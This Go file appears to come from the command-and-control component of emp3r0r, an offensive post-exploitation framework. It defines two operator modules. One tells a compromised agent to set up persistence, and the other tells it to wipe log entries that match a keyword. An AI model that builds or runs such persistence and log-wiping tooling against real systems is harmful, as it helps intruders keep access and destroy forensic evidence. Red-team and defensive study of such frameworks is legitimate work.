package cc

import (
	"fmt"

	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
)

func modulePersistence() {
	methodOpt, ok := AvailableModuleOptions["method"]
	if !ok {
		LogError("Option 'method' not found")
		return
	}
	cmd := fmt.Sprintf("%s --method %s", emp3r0r_def.C2CmdPersistence, methodOpt.Val)
	err := SendCmd(cmd, "", ActiveAgent)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
}

func moduleLogCleaner() {
	keywordOpt, ok := AvailableModuleOptions["keyword"]
	if !ok {
		LogError("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", emp3r0r_def.C2CmdCleanLog, keywordOpt.Val)
	err := SendCmd(cmd, "", ActiveAgent)
	if err != nil {
		LogError("SendCmd: %v", err)
		return
	}
}
